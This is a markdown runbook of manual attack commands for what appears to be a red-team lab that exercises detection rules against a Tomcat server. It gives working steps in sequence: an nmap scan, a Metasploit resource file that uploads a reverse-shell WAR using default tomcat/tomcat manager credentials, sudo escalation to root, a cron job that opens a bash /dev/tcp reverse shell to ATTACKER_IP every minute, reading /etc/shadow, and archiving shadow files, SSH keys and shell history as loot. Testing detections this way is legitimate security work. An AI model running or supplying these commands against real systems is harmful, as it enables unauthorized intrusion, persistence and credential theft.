# Manual Attack Commands

Extracted from `tomcatastrophe.py` for manual testing.

---

## Setup: Set Environment Variables

Run these first on red-01, replacing with your actual private IPs:

```bash
# Set the target (blue-01 private IP)
export TARGET_IP="10.0.1.x"

# Set the attacker (red-01 private IP - this machine)
export ATTACKER_IP="10.0.1.x"

# Verify
echo "Target: $TARGET_IP | Attacker: $ATTACKER_IP"
```

---

## Phase 0: Reconnaissance

```bash
# Port scan with service detection
nmap -sT -p 22,80,443,8080,8443 -Pn -sV --open $TARGET_IP
```

---

## Phase 1: Initial Access (Metasploit)

Create a resource file `exploit.rc`:

```bash
cat > /tmp/exploit.rc << EOF
# Start persistent handler
use exploit/multi/handler
set payload java/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j

# Wait for handler to start
sleep 2

# Run Tomcat exploit
back
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS $TARGET_IP
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set TARGETURI /manager
set FingerprintCheck false
set payload java/shell_reverse_tcp
set LHOST $ATTACKER_IP
set LPORT 4444
set DisablePayloadHandler true
show options
exploit

# Check for sessions
sleep 5
sessions -l
EOF
```

Then run:

```bash
msfconsole -r /tmp/exploit.rc
```

---

## Phase 3: Discovery (run in Meterpreter shell)

```bash
# In msfconsole, interact with session first
sessions -i 1
shell

# Then run these commands
whoami
id
uname -a
hostname
cat /etc/passwd | grep -v nologin

# Enumerate kernel modules (triggers Enumeration of Kernel Modules rule)
lsmod

exit
```

---

## Phase 4: Privilege Escalation (run in Meterpreter shell)

```bash
shell

# Enumerate sudo (triggers detection)
sudo -l
sudo -V

# Escalate to root
sudo /bin/bash
whoami

exit
```

---

## Phase 5: Persistence (run in shell)

```bash
# From msfconsole, get a shell
sessions -i 1
shell

# Escalate to root first
sudo /bin/bash

# Create a reverse shell cron job (triggers detection)
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/4445 0>&1'" | crontab -

# Verify the cron job was created
crontab -l

# Exit back to msfconsole
background
```

**Note:** Replace `$ATTACKER_IP` with the actual IP (e.g., `10.0.1.119`). The cron job runs every minute.

To catch the callback, set up a listener on red-01 in a separate terminal:

```bash
nc -lvnp 4445
```

---

## Phase 6: Credential Access (run in shell)

```bash
sessions -i 1

whoami
sudo cat /etc/shadow
```

---

## Phase 7: Collection (run in Meterpreter shell)

```bash
shell

# Compress sensitive files for exfiltration (triggers Sensitive Files Compression rule)
# The rule detects tar/zip/gzip with sensitive file paths in args
sudo tar -czf /tmp/loot.tar.gz /etc/shadow /etc/passwd /home/*/.ssh/authorized_keys /home/*/.bash_history 2>/dev/null

# Verify the archive was created
ls -la /tmp/loot.tar.gz

exit
```

---

## Quick Start (Phases 0-1 only)

```bash
# 1. Set your IPs first
export TARGET_IP="10.0.1.x"
export ATTACKER_IP="10.0.1.x"

# 2. Run nmap scan
nmap -sT -p 22,80,443,8080,8443 -Pn -sV --open $TARGET_IP

# 3. Create exploit.rc (run the Phase 1 cat command above)

# 4. Start Metasploit with the exploit
msfconsole -r /tmp/exploit.rc

# 5. After getting shell, interact:
sessions -l
sessions -i 1
```
